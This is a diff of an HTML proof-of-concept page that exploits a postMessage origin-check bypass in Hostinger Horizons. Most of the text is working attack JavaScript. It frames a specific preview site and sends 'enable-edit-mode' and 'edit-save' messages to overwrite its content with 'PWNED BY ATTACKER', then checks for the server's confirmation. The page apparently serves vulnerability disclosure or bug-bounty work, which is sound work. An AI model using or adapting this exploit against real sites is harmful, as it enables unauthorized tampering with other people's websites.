@@ -9,216 +9,160 @@
     .meta { color: #888; font-size: 13px; margin-bottom: 16px; }
     .meta strong { color: #ff0; }
 
-    /* Status bar */
     #status {
       background: #111;
       border: 2px solid #555;
       border-radius: 6px;
       padding: 12px 16px;
-      margin-bottom: 12px;
+      margin-bottom: 10px;
       font-size: 15px;
       min-height: 48px;
-      transition: border-color 0.3s;
     }
-    #status.waiting  { border-color: #555; color: #888; }
-    #status.ready    { border-color: #ff0; color: #ff0; }
-    #status.success  { border-color: #0f0; color: #0f0; }
-    #status.error    { border-color: #f00; color: #f00; }
+    #status.waiting { border-color: #555; color: #888; }
+    #status.ready   { border-color: #ff0; color: #ff0; }
+    #status.success { border-color: #0f0; color: #0f0; }
+    #status.error   { border-color: #f00; color: #f00; }
 
-    /* Log */
+    .buttons { margin-bottom: 10px; display: flex; gap: 8px; flex-wrap: wrap; }
+    button {
+      background: #0f0; color: #000; border: none;
+      padding: 9px 18px; cursor: pointer; font-weight: bold;
+      font-family: monospace; font-size: 13px; border-radius: 3px;
+    }
+    button:disabled { background: #333; color: #666; cursor: not-allowed; }
+    button.red  { background: #f44; }
+    button.blue { background: #0af; }
+    button.grey { background: #555; color: #fff; }
+
     #log {
-      background: #000;
-      border: 1px solid #333;
-      border-radius: 4px;
-      padding: 10px;
-      height: 160px;
-      overflow-y: auto;
-      font-size: 12px;
-      margin-bottom: 12px;
+      background: #000; border: 1px solid #333; border-radius: 4px;
+      padding: 10px; height: 130px; overflow-y: auto;
+      font-size: 12px; margin-bottom: 10px;
     }
-    .log-sent     { color: #f90; }
-    .log-received { color: #0af; }
-    .log-success  { color: #0f0; font-weight: bold; }
-    .log-error    { color: #f44; }
-    .log-info     { color: #888; }
+    .s { color: #f90; }   /* sent */
+    .r { color: #0af; }   /* received */
+    .ok { color: #0f0; font-weight: bold; } /* success */
+    .er { color: #f44; }  /* error */
+    .i  { color: #666; }  /* info */
 
-    /* iframe */
     iframe {
-      width: 100%;
-      height: 480px;
-      border: 3px solid #555;
-      border-radius: 4px;
-      display: block;
+      width: 100%; height: 460px;
+      border: 3px solid #555; border-radius: 4px; display: block;
     }
-    iframe.attack-active { border-color: #f90; }
-    iframe.attack-done   { border-color: #0f0; }
-
-    /* Payload display */
-    #payload-box {
-      background: #000;
-      border: 1px solid #333;
-      border-radius: 4px;
-      padding: 10px;
-      font-size: 12px;
-      margin-bottom: 12px;
-      display: none;
-      word-break: break-all;
-    }
-    #payload-box .label { color: #888; margin-bottom: 4px; }
-    #payload-box .value { color: #0af; }
+    iframe.armed { border-color: #ff0; }
+    iframe.done  { border-color: #0f0; }
   </style>
 </head>
 <body>
 
-  <h2>PoC: Hostinger Horizons — postMessage origin bypass → unauthorized website edit</h2>
-  <div class="meta">
-    Attacker origin: <strong id="attacker-origin"></strong> &nbsp;|&nbsp;
-    NOT in <code>ALLOWED_PARENT_ORIGINS</code> &nbsp;|&nbsp;
-    Target: <strong>https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com</strong>
-  </div>
+<h2>PoC: Hostinger Horizons — postMessage origin bypass → unauthorized website edit</h2>
+<div class="meta">
+  Attacker origin: <strong id="my-origin"></strong> &nbsp;·&nbsp;
+  NOT in <code>ALLOWED_PARENT_ORIGINS</code> &nbsp;·&nbsp;
+  Target: <strong>https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com</strong>
+</div>
 
-  <!-- Attack status -->
-  <div id="status" class="waiting">Waiting for iframe to load...</div>
+<div id="status" class="waiting">Waiting for iframe to load…</div>
 
-  <!-- Live log -->
-  <div id="log"></div>
+<div class="buttons">
+  <button onclick="step1()" id="btn1">① Enable edit mode</button>
+  <button onclick="step3()" id="btn3" class="red">③ Fire edit-save (after clicking in iframe)</button>
+  <button onclick="resetAll()" class="grey">↺ Reset (reload iframe)</button>
+</div>
 
-  <!-- Captured payload (shown on success) -->
-  <div id="payload-box">
-    <div class="label">POST /api/apply-edit — captured payload:</div>
-    <div class="value" id="payload-content"></div>
-  </div>
+<div id="log"></div>
 
-  <!-- The victim's preview, framed by the attacker -->
-  <iframe
-    id="target"
-    src="https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com/"
-  ></iframe>
+<iframe id="target" src="https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com/"></iframe>
 
-  <script>
-    // ─── Config ──────────────────────────────────────────────────────────────
-    const ATTACKER_PAYLOAD = 'PWNED BY ATTACKER — postMessage no origin check';
+<script>
+  const PAYLOAD = 'PWNED BY ATTACKER — postMessage no origin check';
+  const TARGET  = 'https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com/';
 
-    // ─── Helpers ─────────────────────────────────────────────────────────────
-    document.getElementById('attacker-origin').textContent = window.location.origin;
+  document.getElementById('my-origin').textContent = window.location.origin;
 
-    const logEl  = document.getElementById('log');
-    const status = document.getElementById('status');
-    const iframe = document.getElementById('target');
+  const iframe  = document.getElementById('target');
+  const logEl   = document.getElementById('log');
+  const statusEl = document.getElementById('status');
 
-    function log(msg, cls = 'log-info') {
-      const ts = new Date().toISOString().split('T')[1].slice(0, 12);
-      logEl.innerHTML += `<span class="${cls}">[${ts}] ${msg}</span><br>`;
-      logEl.scrollTop = logEl.scrollHeight;
+  function log(msg, cls = 'i') {
+    const ts = new Date().toISOString().split('T')[1].slice(0, 12);
+    logEl.innerHTML += `<span class="${cls}">[${ts}] ${msg}</span><br>`;
+    logEl.scrollTop = logEl.scrollHeight;
+  }
+
+  function setStatus(msg, cls) {
+    statusEl.textContent = msg;
+    statusEl.className = cls;
+  }
+
+  function send(type, payload) {
+    const msg = payload !== undefined ? { type, payload } : { type };
+    iframe.contentWindow.postMessage(msg, '*');
+    log(`→ SENT  type="${type}"  payload=${JSON.stringify(payload ?? null)}`, 's');
+  }
+
+  // ── Step 1: enable edit mode ──────────────────────────────────────────────
+  function step1() {
+    send('enable-edit-mode');
+    iframe.classList.add('armed');
+    setStatus('② Edit mode enabled. Now click any text in the preview iframe below, then click ③.', 'ready');
+    log('Edit mode sent. Click "Hello" (or any text) inside the iframe now.', 'i');
+  }
+
+  // ── Step 3: fire edit-save ────────────────────────────────────────────────
+  function step3() {
+    send('edit-save', { newText: PAYLOAD });
+    setStatus('edit-save sent — check DevTools → Network for POST /api/apply-edit', 'ready');
+    log('edit-save fired. Open DevTools → Network → find apply-edit → verify 200 OK.', 'ok');
+  }
+
+  // ── Reset: reload iframe, restart cleanly ─────────────────────────────────
+  function resetAll() {
+    log('--- Resetting: reloading iframe ---', 'i');
+    iframe.classList.remove('armed', 'done');
+    setStatus('Reloading iframe…', 'waiting');
+    iframe.src = TARGET + '?t=' + Date.now(); // cache-bust
+  }
+
+  // ── Auto step-1 on load ───────────────────────────────────────────────────
+  iframe.addEventListener('load', () => {
+    log('iframe loaded ✓ — origin: ' + window.location.origin, 'i');
+    setStatus('Iframe loaded. Click ① to enable edit mode.', 'ready');
+
+    // If you want fully automatic step1, uncomment:
+    // setTimeout(step1, 1000);
+  });
+
+  // ── Listen for any messages coming back from app-preview ──────────────────
+  window.addEventListener('message', (event) => {
+    if (!event.origin.includes('app-preview') && !event.origin.includes('horizons')) return;
+
+    const type = event.data?.type || event.data?.message;
+    log(`← RECV  origin="${event.origin}"  type="${type}"`, 'r');
+
+    if (type === 'editEnter') {
+      const txt = event.data?.payload?.currentText;
+      log(`editEnter — element clicked, currentText="${txt}". currentEditingInfo is now set inside iframe.`, 'ok');
+      setStatus(`Element clicked ("${txt}"). Click ③ now to fire edit-save.`, 'ready');
     }
 
-    function setStatus(msg, cls) {
-      status.textContent = msg;
-      status.className = cls;
+    if (type === 'editApplied') {
+      log('editApplied received — server confirmed the write!', 'ok');
+      setStatus('SUCCESS — /api/apply-edit returned 200. Content overwritten.', 'success');
+      iframe.classList.remove('armed');
+      iframe.classList.add('done');
     }
 
-    function send(type, payload) {
-      const msg = payload !== undefined ? { type, payload } : { type };
-      iframe.contentWindow.postMessage(msg, '*');
-      log(`→ SENT  type="${type}"  payload=${JSON.stringify(payload ?? null)}`, 'log-sent');
+    if (type === 'route-changed') {
+      // HMR reloaded the page inside iframe after edit — state is reset
+      log('route-changed: iframe reloaded (HMR). currentEditingInfo is now NULL. Click ↺ Reset then redo ①②③.', 'er');
+      setStatus('Iframe reloaded after edit (HMR). Click ↺ Reset to start fresh.', 'error');
+      iframe.classList.remove('armed', 'done');
     }
+  });
 
-    // ─── Step 1: iframe loaded → enable edit mode ────────────────────────────
-    iframe.addEventListener('load', () => {
-      log('iframe loaded — sending enable-edit-mode from ' + window.location.origin, 'log-info');
-      iframe.classList.add('attack-active');
-
-      setTimeout(() => {
-        send('enable-edit-mode');
-        setStatus('Step 1 done: edit mode enabled. ▶ Now click ANY text inside the preview below.', 'ready');
-        log('Waiting for victim to click an editable element inside the iframe...', 'log-info');
-      }, 1500);
-    });
-
-    // ─── Step 2: listen for editEnter from the iframe ────────────────────────
-    // When the victim clicks an editable element, app-preview sends
-    // { type: "editEnter", payload: { currentText: "..." } } to window.parent.
-    // Since WE are the parent (not horizons.hostinger.com), we receive it.
-    // currentEditingInfo is now set inside the iframe — we can fire edit-save.
-
-    let attackFired = false;
-
-    window.addEventListener('message', (event) => {
-      if (!event.origin.includes('app-preview')) return;
-
-      const type = event.data?.type || event.data?.message;
-      log(`← RECV  origin="${event.origin}"  type="${type}"  data=${JSON.stringify(event.data).slice(0, 120)}`, 'log-received');
-
-      // editEnter fires when victim clicks an element in edit mode
-      // → currentEditingInfo is now set inside the iframe
-      if (type === 'editEnter' && !attackFired) {
-        attackFired = true;
-        const currentText = event.data?.payload?.currentText || '(unknown)';
-        log(`editEnter received! currentText="${currentText}" — firing edit-save now`, 'log-success');
-        setStatus(`Step 2: editEnter received (element clicked). Firing edit-save...`, 'ready');
-
-        setTimeout(() => {
-          send('edit-save', { newText: ATTACKER_PAYLOAD });
-          setStatus('Step 3: edit-save sent. Waiting for server response...', 'ready');
-        }, 300);
-      }
-
-      // editApplied = server accepted the write (sent back if parent is allowed origin)
-      // May NOT arrive here since we're not in ALLOWED_PARENT_ORIGINS — but the
-      // POST /api/apply-edit already fired regardless. Check Network tab.
-      if (type === 'editApplied') {
-        const editId = event.data?.payload?.editId;
-        log(`editApplied received! editId="${editId}" — write confirmed by iframe`, 'log-success');
-        onSuccess(event.data?.payload);
-      }
-    });
-
-    // ─── Intercept fetch inside iframe to capture the request ────────────────
-    // We inject a fetch interceptor via postMessage... but that's cross-origin.
-    // Instead: after sending edit-save, poll the parent for confirmation by
-    // watching for /api/apply-edit in the browser network tab.
-    // The editApplied message is the in-page confirmation.
-
-    // Fallback: after 5s with no editApplied, still show partial success
-    // (POST was sent; origin check on editApplied blocks the reply to us)
-    let fallbackTimer = null;
-
-    window.addEventListener('message', (event) => {
-      if (event.data?.type === 'edit-save' || (event.origin.includes('app-preview') && event.data?.type === 'editEnter')) {
-        clearTimeout(fallbackTimer);
-        fallbackTimer = setTimeout(() => {
-          if (!document.getElementById('status').classList.contains('success')) {
-            setStatus(
-              'POST /api/apply-edit was sent (check Network tab). editApplied not relayed back (origin check on that direction). See Network tab for 200 OK.',
-              'success'
-            );
-            iframe.classList.remove('attack-active');
-            iframe.classList.add('attack-done');
-            log('Attack complete. POST /api/apply-edit fired. Verify in DevTools → Network.', 'log-success');
-          }
-        }, 5000);
-      }
-    });
-
-    function onSuccess(payload) {
-      setStatus('SUCCESS — /api/apply-edit returned 200. Website content overwritten.', 'success');
-      iframe.classList.remove('attack-active');
-      iframe.classList.add('attack-done');
-
-      const box = document.getElementById('payload-box');
-      box.style.display = 'block';
-      document.getElementById('payload-content').textContent = JSON.stringify({
-        editId: payload?.editId,
-        newFullText: ATTACKER_PAYLOAD
-      }, null, 2);
-    }
-
-    // Kick off fallback timer when edit-save is sent
-    const _origSend = send;
-    // (fallback logic already wired above via message listener)
-
-    log('PoC loaded. Attacker origin: ' + window.location.origin, 'log-info');
-    log('This origin is NOT in ALLOWED_PARENT_ORIGINS — attack proceeds anyway.', 'log-info');
-  </script>
+  log('PoC ready. Attacker origin: ' + window.location.origin, 'i');
+  log('NOT in ALLOWED_PARENT_ORIGINS — all edit handlers accept messages anyway.', 'i');
+</script>
 </body>
 </html>
